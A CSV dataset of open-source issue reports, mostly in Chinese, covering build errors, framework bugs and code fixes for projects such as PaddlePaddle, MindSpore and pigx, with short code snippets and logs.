title,text
CMake Error at cmake/inference_lib.cmake:270编译错误,PaddlePaddle v1.7.0 OS jetson nano ubuntu18.04 ARM aarch64 cortex-a57 cuda 10.0 cudnn 7.6.3.28 python 3.6 virtualenv 本地编译 报错   <code>: cmake .. \ -DWITH_CONTRIB=OFF \ -DFLUID_INFERENCE_INSTALL_DIR=/opt/paddle \ -DWITH_MKL=OFF \ -DWITH_MKLDNN=OFF \ -DWITH_TESTING=OFF \ -DCMAKE_BUILD_TYPE=Release \ -DON_INFER=ON \ -DWITH_PYTHON=ON \ -DWITH_XBYAK=OFF \ -DWITH_NV_JETSON=ON \ -DPY_VERSION=3.6 CMake Error at cmake/inference_lib.cmake:270 (file): file failed to open for writing (No such file or directory):
Android手机读取图像数据问题。,"我根据Mobile中Android的Dome做了一个图像分类的，但是在读取出了点问题。在Java中，是把图像转成字节数组的，所以我也是这个样做，如下代码。但是pixels这个字节数组得到的结果是不定长的，但是图像明明都是3*32*32的。大小应该都是3072才对。这是为什么呢？ 就是因为上面的大小没有充满矩阵，导致array很多都是0的。 这个怎么解决？？？求解答。   <code>: public String infer(String img_path) { //把图像读取成一个Bitmap对象 Bitmap bitmap = BitmapFactory.decodeFile(img_path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos); //把图像生成一个字节数组 byte[] pixels = baos.toByteArray(); Log.i(""datas大小为"", String.valueOf(pixels.length)); try { baos.close(); } catch (IOException e) { e.printStackTrace(); } if (mRgbBytes == null) { mRgbBytes = new byte[3072]; } for (int i = 0; i &lt; pixels.length; i++) { mRgbBytes[i] = pixels[i]; Log.i(""ImageRecognition"", String.valueOf(mRgbBytes[i])); } // 获取预测结果 float[] result = infer(mRgbBytes); // 把概率最大的结果提取出来 float max = 0; int number = 0; for (int i = 0; i &lt; result.length; i++) { if (result[i] &gt; max) { max = result[i]; number = i; } } String msg = ""类别为："" + clasName[number] + ""，可信度为："" + max; Log.i(""ImageRecognition"", msg); return msg; } for (size_t c = 0; c &lt; 3; ++c) { for (size_t h = 0; h &lt; 32; ++h) { for (size_t w = 0; w &lt; 32; ++w) { array[index] = static_cast&lt;float&gt;(((pixels[(h * 32 + w) * 3 + c]) - means[c]) / 255.0); LOGI(""array_src:%f"", array[index]); index++; } } }"
下载静态文件Excel 内容乱码 怎样进行配置处理,"下载静态文件Excel 内容乱码 怎样进行配置处理 环境信息 pigx版本: 4.0.0 提供详细 ###代码 @RequestMapping(value = ""/downloadExcel"") @ResponseBody public void downloadExcel(HttpServletResponse res, HttpServletRequest req, String name) throws Exception { String fileName = name + "".xls""; String filePath = getClass().getResource(""/static/"" + fileName).getPath(); /** 将文件名称进行编码 */ res.setHeader(""content-disposition"", ""attachment;filename="" + URLEncoder.encode(fileName, ""UTF-8"")); res.setContentType(""content-type:octet-stream;charset=utf-8""); res.setCharacterEncoding(""UTF-8"");   <code>: BufferedInputStream inputStream = new BufferedInputStream(new FileInputStream(new File(filePath))); OutputStream outputStream = res.getOutputStream(); byte[] buffer = new byte[1024]; int len; while ((len = inputStream.read(buffer)) != -1) { /** 将流中内容写出去 .*/ outputStream.write(buffer, 0, len); } inputStream.close(); outputStream.close(); }"
fix switch layer sigle prim cell,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : def test_switch_layer_with_single_prim(): class SwitchLayerCell(nn.Cell): def init(self): super(SwitchLayerCell, self).init() self.layers = (nn.ReLU(), nn.ReLU()) self.z3 = Parameter( Tensor(np.full([128, 96], 0.6, dtype=np.float32)), name='z3') eroro raised for the testcase pass   <code>: def construct(self, index, x): ret = self.layers[index](x) * self.z3 return ret index = Tensor(0, dtype=mstype.int32) net = SwitchLayerCell() net(index, Tensor(np.full([128, 96], 0.6, dtype=np.float32))) C.grad_by_list(net, ParameterTuple(net.trainable_params()))(index, Tensor(np.full([128, 96], 0.6, dtype=np.float32))) C.grad_all(net)(index, Tensor(np.full([128, 96], 0.6, dtype=np.float32)))"
Paddlepaddle如何求一个矩阵的MAX？类似fluid.layers.XXX的运算API,"大家好！ 现在在用paddle fluid写一些计算图，但是想写求矩阵中最大元素的值的时候，发现写不了。 我想用argmax先得坐标，然后再用crop把最大值切出来，但是报错，说是offset和input向量的维度不一致。但是paddlepaddle好像也没有类似numpy.squeeze的API。 报错： 请求大神指点一下怎么做。感谢各位！   <code>: logits_i_not_t = fluid.layers.elementwise_mul(screen_target_logit,logits) logit_target = fluid.layers.elementwise_mul(target,logits) maxlogit_i_not_t = fluid.layers.argmax(logits_i_not_t,axis=1) crop = fluid.layers.crop(logits_i_not_t, shape=shape, offsets=maxlogit_i_not_t) Traceback (most recent call last): File ""cw_unit_test.py"", line 219, in &lt;module&gt; fetch_list=[loss]) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/executor.py"", line 449, in run self.executor.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: enforce rank == offsets_tensor-&gt;dims()[0] failed, 2 != 1 Offsets size should be equal to dimension size of input tensor. at [/paddle/paddle/fluid/operators/crop_op.h:41] PaddlePaddle Call Stacks: 0 0x7f303e122896p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486"
double free or corruption ,"在调用CAPI进行打分的时候，加载都没有问题。但是运行到这行代码就会爆出如图所示的错误。请问这是什么原因呢？？   <code>: paddle_gradient_machine_forward(machine, in_args, out_args, false);"
docker build on CUDA 8,"CUDA 7.5 images can not run on new generation Pascal architectures. A lot of GPUs are now pascal: GTX 1060, GTX 1070, GTX 1080, Pascal Titan X. I think we need to switch to CUDA 8.0 for our docker images. I tried to compile CUDA 8 by switch dev build dockerfile and production image dockerfile based on cuda-8. But it does not work: When running paddle from built image, I got: Maybe @gangliao understands more about the build process.   <code>: ImportError: libcudart.so.7.5: cannot open shared object file: No such file or director"
设置小程序首页时，新增富文本之后列表页面报错,app/common/model/Page.php 修改为： app/common/library/helper.php 新增function   <code>: /** * 获取器：格式化页面数据 * @param $json * @return array */ public function getPageDataAttr(string $json) { // 数据转义 $array = helper::jsonDecode($json); $array = helper::decodeHTML($array); // 合并默认数据 return $this-&gt;_mergeDefaultData($array); } /** * 修改器：自动转换data为json格式 * @param array $value * @return string */ public function setPageDataAttr(array $value){ return helper::jsonEncode($value ?: ['items' =&gt; []]); } /** * 对象转义html内容 * @param $json * @return array */ public static function decodeHTML($obj){ if($obj == null){ return null; } if(is_string($obj)){ return htmlspecialchars_decode($obj); } if(is_array($obj)){ foreach ($obj as &amp;$item) { $item = helper::decodeHTML($item); } }else if(is_object($obj)){ foreach ($obj as $key =&gt; &amp;$value) { $value = helper::decodeHTML($value); } } return $obj; }
Add support for loading from buffer for inference framework,This is a follow up to PR #8024:Multi-card mode does not work. The basic idea is to have 2 additional functions to support loading from buffer instead of files.   <code>: load()
The usage of parent scope in the scope design.,"The scope has a parent scope with type and has a constructor for it: But the scope pointer is used in the operator as follows: In the recurrent operator, we want to create a new local scope with a global parent scope. The global parent scope is passed by the network. There is a potential danger. If the local scope is released, reference count of parent scope will be decrease to zero, then the parent scope, namely global scope, will be released too. We can simply test this case in the as follows. There will be an error.   <code>: shared_ptr explicit Scope(const std::shared_ptr&lt;Scope&gt;&amp; parent) : parent_(parent) {} class OpContext { public: Scope* scope; DeviceContext* device_context; }; scope_test.cc TEST(Scope, Parent) { using paddle::framework::Scope; using paddle::framework::Variable; // auto parent_scope = std::make_shared&lt;Scope&gt;(); Scope* parent_scope = new Scope(); Variable* var0 = parent_scope-&gt;CreateVariable(""a""); EXPECT_NE(var0, nullptr); { auto scope = std::make_shared&lt;Scope&gt;(std::shared_ptr&lt;Scope&gt;(parent_scope)); /// GetVariable will get Variable from parent scope if exist. Variable* var1 = scope-&gt;GetVariable(""a""); EXPECT_EQ(var0, var1); } // the scope will be released Variable* var2 = parent_scope-&gt;GetVariable(""a""); EXPECT_EQ(var0, var2); }"
终端管理，修改授权模式，点击“保存”，出错,pigx版本: 3.6 是否修改包名: 否 终端管理，修改授权模式，点击“保存”，序列化出错： Uncaught (in promise) Error: JSON parse error: Cannot deserialize instance of out of START_ARRAY token; nested exception is com.fasterxml.jackson.databind.exc.MismatchedInputException: Cannot deserialize instance of out of START_ARRAY token 前端打印post数据： 感觉authorizedGrantTypes应该是字符串才对 如截图1： 详细回显步骤 1、选择【终端管理】 2、选择一条记录 3、修改授权模式，增加或者减少一个选项 4、点击【保存】，出错   <code>: java.lang.String java.lang.String
avue 表格显示错位,pigx版本: 3.3   <code>: 表格设置height属性，表头和下面的内容不能对齐
java.lang.UnsupportedOperationException: class org.beetl.sql.core.mapping.StreamData,方法如下：   <code>: StreamData&lt;Data&gt; select();
dropdown-menu-border-color 调整,dropdown-menu-border-color 调整 无 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: .dropdown-menu { --bs-dropdown-border-color: #ced4da; }
Android Studio 3.2 编译开源中国源码,直接下载下载源码用 as 3.2 编译会报各种错误，以下是解决方案： 注意版本 gradle 使用 3.5 classpath 'com.android.tools.build:gradle:2.2.3' classpath 'com.getkeepsafe.dexcount:dexcount-gradle-plugin:0.6.2' local.properties 中定义以下变量，请不要关心变量的值 通过以上设置成功在 as 3.2 编译成功。   <code>: AES_KEY = 1234567891234567 AES_IV = 9876543217894561 VIOLET_PASSCODE = 123
Loss falls too fast on CPU with Parallel Executor ,When I try to reproduce ResNet50 MKL training benchmark with the scripts you provided https://github.com/PaddlePaddle/Paddle/issues/11620 with I found that loss value falls strangely fast from 6.96 to 0.00363376 during 60 iterations. You can see it from below figure. Look forwards to your response.   <code>: export CPU_NUM=32 python train_resnet.py --display_step=1 --warmup=0 --use_gpu=false --number_iteration=20 --skip_first_steps=5 --batch_size_per_trainer=2
[CT][MS][HardSigmoid]api 文档的公式以及样例有些问题,"api 文档的公式以及样例有些问题 /mode graph   <code>: &gt;&gt;&gt; x = Tensor(np.array([ -3.5, 0, 4.3]), mindspore.float32) &gt;&gt;&gt; output = ops.hardsigmoid(x) &gt;&gt;&gt; print(output)"
"附件上传限制文件类型时, 文件选择对话框需要限制文件类型","JDK版本： openjdk_8_201 erupt版本： 1.10.6   <code>: @EruptField( views = @View( title = ""产品视频"" ), edit = @Edit( title = ""产品视频"", type = EditType.ATTACHMENT, search = @Search, attachmentType = @AttachmentType(fileTypes = {""mp4""}) ) ) private String video = """";"
Python help outputs operator documents,The following code snippet automatically exports operators into Python layer functions: https://github.com/PaddlePaddle/Paddle/blob/6d649d9ebd2be27f796e07cf79d26d5e8539d2f3/python/paddle/v2/framework/layers.py#L111-L179 We need to improve it so that users can use Python's function to retrieve the document of the layer/operator.   <code>: help
字典假删方案,"现在在sysdictata中提供了两个字段Status(2删除) Isdelete 但是删除的时候直接物理删除了, 在实际场景中我们是需要做假删的 所以我的方案是 删除的做假删 dictData.Status = CommonStatus.DELETED; dictData.IsDeleted = true; 然后在加载的时候根据是否是管理员进行条件判断 然后管理员加载所有数据,非管理员加载未删除数据 然后管理员角色进去后可以看见三个状态的数据,假设这时候管理员点击删除数据状态=2的数据的时候可以进行物理删除 ,这样即使用户误删了,管理员还可以拯救一下 楼主看是否需要搞个pr   <code>: bool supperAdmin = false; var userManager = App.GetService&lt;IUserManager&gt;(); if (userManager.SuperAdmin) { supperAdmin = true; } var code = !string.IsNullOrEmpty(input.Code?.Trim()); var value = !string.IsNullOrEmpty(input.Value?.Trim()); var dictDatas = await _sysDictDataRep.DetachedEntities .Where(u =&gt; u.TypeId == input.TypeId) .Where((code, u =&gt; EF.Functions.Like(u.Code, $""%{input.Code.Trim()}%"")), (value, u =&gt; EF.Functions.Like(u.Value, $""%{input.Value.Trim()}%""))) .Where(u =&gt; (u.Status != CommonStatus.DELETED &amp;&amp; !supperAdmin) || (u.Status &lt;= CommonStatus.DELETED &amp;&amp; supperAdmin)).OrderBy(u =&gt; u.Sort) .Select(u =&gt; u.Adapt&lt;DictDataOutput&gt;()) .ToPagedListAsync(input.PageNo, input.PageSize); return XnPageResult&lt;DictDataOutput&gt;.PageResult(dictDatas); var dictData = await _sysDictDataRep.FirstOrDefaultAsync(u =&gt; u.Id == input.Id); if (dictData == null) throw Oops.Oh(ErrorCode.D3004); if(dictData.Status== CommonStatus.DELETED) { await _sysDictDataRep.DeleteAsync(); } else { dictData.Status = CommonStatus.DELETED; dictData.IsDeleted = true; await _sysDictDataRep.UpdateAsync(dictData); }"
富文本框里上传图片失败,"根据开发文档-常见问题-富文本编辑器文件上传 里面的写法实现不了啊，求助，万分感谢！   <code>: $('.summernote').summernote({ height : '220px', lang : 'zh-CN', callbacks: { onImageUpload: function(files, editor, $editable) { var formData = new FormData(); formData.append(""file"", files[0]); $.ajax({ type: ""POST"", url: ctx + ""common/upload"", data: data, cache: false, contentType: false, processData: false, dataType: 'json', success: function(result) { if (result.code == web_status.SUCCESS) { $(obj).summernote('editor.insertImage', result.url, result.fileName); } else { $.modal.alertError(result.msg); } }, error: function(error) { $.modal.alertWarning(""图片上传失败。""); } }); } } });"
r.getUrl()的bug,"1. 您当前使用的版本 go 1.12, win64 2. 您当前使用的框架版本？ 1.9.2 3. 更新到最新的框架版本是否能够解决问题？ 无法 4. 问题描述？ 如代码 如果是http请求，但是这里打印的也是https://xxx.com/xxx 5. 您期望得到的结果？ 是http就http，https就是https 6. 您实际得到的结果？   <code>: func Get(r *ghttp.Request) { fmt.Println(""--Get--"", r.GetUrl()) }"
[ST][MS][NET][bert-large][GPU 8p/1p]FPS[148] can not reach 260,"bert-large网络在GPU环境训练 1p性能17/fps达不到38,8p性能148/fps达不到260 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:44379cd4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221006 MindSpore 版本：编译时间20221009160040 r1.9 commit_id:44379cd4 (/): /mode graph test_ms_bert_large_cn_news_train_check_loss_gpu_8p_0001.py test_ms_bert_large_cn_news_train_check_perf_gpu_1p_0002.py 1.cd solution_test/cases/02network/02nlp/bert/train 2.pytest -s test_ms_bert_large_cn_news_train_check_perf_gpu_1p_0002.py 3. 网络训练成功，1p性能能达到38,8p性能能达到260 走给安正气   <code>: Train epoch time: 227161.074 ms, per step time: 11358.054 ms Train epoch time: 34731.241 ms, per step time: 1736.562 ms Train epoch time: 34701.717 ms, per step time: 1735.086 ms Train epoch time: 34609.824 ms, per step time: 1730.491 ms Train epoch time: 34582.973 ms, per step time: 1729.149 ms Train epoch time: 34803.168 ms, per step time: 1740.158 ms Train epoch time: 34486.342 ms, per step time: 1724.317 ms Train epoch time: 34450.758 ms, per step time: 1722.538 ms Train epoch time: 34583.315 ms, per step time: 1729.166 ms Train epoch time: 34515.041 ms, per step time: 1725.752 ms Train epoch time: 34609.228 ms, per step time: 1730.461 ms Train epoch time: 34532.082 ms, per step time: 1726.604 ms Train epoch time: 34456.404 ms, per step time: 1722.820 ms Train epoch time: 34452.404 ms, per step time: 1722.620 ms Train epoch time: 34424.556 ms, per step time: 1721.228 ms Train epoch time: 34483.534 ms, per step time: 1724.177 ms Train epoch time: 34354.331 ms, per step time: 1717.717 ms Train epoch time: 34705.803 ms, per step time: 1735.290 ms Train epoch time: 34780.121 ms, per step time: 1739.006 ms Train epoch time: 34498.073 ms, per step time: 1724.904 ms Train epoch time: 34444.070 ms, per step time: 1722.204 ms Train epoch time: 34568.421 ms, per step time: 1728.421 ms Train epoch time: 34610.660 ms, per step time: 1730.533 ms Train epoch time: 34732.686 ms, per step time: 1736.634 ms Train epoch time: 34624.258 ms, per step time: 1731.213 ms Train epoch time: 34528.357 ms, per step time: 1726.418 ms Train epoch time: 34580.022 ms, per step time: 1729.001 ms Train epoch time: 34955.069 ms, per step time: 1747.753 ms"
